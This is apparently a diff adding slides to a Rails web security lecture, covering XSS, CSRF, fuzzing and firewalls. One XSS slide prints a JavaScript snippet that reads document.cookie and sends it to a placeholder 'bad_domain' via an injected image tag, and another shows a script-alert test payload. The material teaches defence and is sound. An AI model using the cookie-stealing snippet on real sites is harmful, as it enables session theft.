@@ -13,10 +13,10 @@ November 5, 2015
 
 * Security Motivation
 * HTTPS
-* Firewalls
 * SQL Injection
 * Cross-Site Scripting
 * Cross-Site Request Forgery
+* Firewalls
 
 ---
 
@@ -528,6 +528,215 @@ Rails does a lot of the work here for you:
 "Her daughter is named Help I'm trapped in a driver's license factory."
 
 (C) Randall Munroe: [http://xkcd.com/327/](http://xkcd.com/327/)
+
+---
+
+# Cross-site Scripting (XSS)
+
+__Javascript is powerful.__
+
+If an attacker can get a user to execute arbitrary javascript on a target site,
+it can issue arbitrary AJAX HTTP requests to that site and GET requests to
+other sites.
+
+AJAX requests are restricted by browsers' same origin policy, but any requests
+to the same domain will include all relevant cookies.
+
+However, Javascript can still be used to read cookies and send secrets to other
+domains via GET requests.
+
+    !javascript
+    var cookie = document.cookie;
+    var element = $('.class_selector');
+    element.innerHTML += '<img src="//bad_domain/_?secret=' + cookie + '">';
+
+---
+
+# XSS Basics
+
+One user submits data that will be displayed to other users of the web
+application (e.g., add a comment to a submission).
+
+When another user visits the page, the server includes this data as part of the
+body of the webpage.
+
+When the victim's browser encounters the data, it executes it inthe same way it
+executes all javascript that is embedded within the HTML document.
+
+---
+
+# XSS Example
+
+![XSS Example](img/xss_example.png)
+
+> How can we prevent XSS from occuring?
+
+---
+
+# XSS Prevention
+
+Never trust data from your users.
+
+As with SQL Injection, lets sanitize data being displayed. Rails already does
+this for you:
+
+Entering `<script>alert("oops");</script>` into a form as a submission title,
+and rendering via `<%= submission.title %>` will produce:
+
+    &lt;script&gt;alert(&quot;oops&quot;);&lt;/script&gt;
+
+__Note__: XSS can also be prevented by disabling inline javascript with a
+Content Security Policy by trading convenience for security.
+
+---
+
+# SQL Injection and XSS Prevention
+
+> How do we make sure we aren't making these sort of mistakes in our web
+> application?
+
+One method is by __fuzzing__.
+
+Fuzzing is the process of automatically submitting semi-random input to an
+appliation and watching for subsequent problematic side-effects.
+
+__Tarantula__ is an automated tool to crawl and fuzz older rails applications
+(doesn't officially support rails 4).
+
+---
+
+# Cross-site Request Forgery (CSRF)
+
+## Ingredients for this attack:
+
+* One malicous server
+* One target web site
+* One unsuspecting user of the target web site who happens to visit the
+  malicious server
+
+__Note__: The user may access the malicious server by ways of a plugin to the
+  target website.
+
+---
+
+# CSRF Explained
+
+While AJAX requests cannot cross domains, the same origin policy does not apply
+to image tags (as we've seen), nor to form elements.
+
+Thus a malicious site can trick a user into making a POST request to a target
+site using that site's cookies.
+
+CSRF could be used to:
+
+* Automatically post a tweet
+* Add a facebook friend
+* Change a password
+
+The possibilities are endless.
+
+---
+
+# Mitigating CSRF
+
+## Ensure that GET requests have no side effects.
+
+This step ensures any CSRF via image tag, or other resource auto-loading tag is
+benign.
+
+## Add a CRSF Protection Token to every request with side effects
+
+Generally every action with side effects originates with the preceeding page
+load.
+
+On those pages insert a hidden CRSF protection token into the form.
+
+Side-effect requests submitted without a valid token are rejected.
+
+---
+
+# CSRF Protection in Rails
+
+    !ruby
+    class ApplicationController < ActionController::Base
+      # Prevent CSRF attacks by raising an exception.
+      protect_from_forgery with: :exception
+    end
+
+The above results in the following being added to all forms (with different
+values of course):
+
+    !html
+    <input name="authenticity_token" type="hidden"
+           value="SLNTcHBDnzl21gPHVoF3DAUEGZLAxWYqZ1FQxBBlmek=">
+
+---
+
+# Firewalls
+
+## Used to secure devices from outside access
+
+* Enforces access control policy between two networks
+* Two designs: restrict _bad traffic_ or permit _good traffic_
+* Designed to operate at different layers of the network stack
+
+## Can influence traffic going out as well
+
+* e.g. [Great Firewall of China](http://www.greatfirewallofchina.org/)
+* We are primarily concerned with inbound traffic
+
+## Can be standalone hardware devices or software
+
+* Often included in multi-purpose device e.g. switch or load balancer
+
+---
+
+# When to use a Firewall
+
+* Use firewalls only when they significantly reduce risk
+* Employ firewalls to protect sensitive data
+    * Critical personally identifiable information
+    * PCI compliance
+* Firewalls should be treated like perimeter security
+    * Like the locks on your house
+* Consider the value of what you are protecting and the cost to firewall it
+    * Like your house, there are some things that are not worth protecting (can you think of examples?)
+
+---
+
+# Firewall Use
+
+* Firewalls are often overused.
+
+> Failed firewalls are the #2 driver of site downtime after failed databases
+
+Scalability Rules, by Martin Abbott
+
+* Can create difficult to scale chokepoint for either network traffic or transaction volume
+
+* May have impact on availability
+     * DDoS attacks on session state memory
+
+---
+
+# Common Firewalls
+
+## Software
+
+* Included with operating systems (ipfw)
+* Can also buy standalone
+
+## Hardware
+
+* Cisco ASA, Citrix AppFirewall, F5 AFM
+
+## EC2 Security Groups
+
+* Allow specific protocols and ports to access server
+* Can restrict machines to only accept traffic from Elastic Load Balancer
+
+
+A typical large scale web service will use both hardware and software firewalls
 
 ---
 
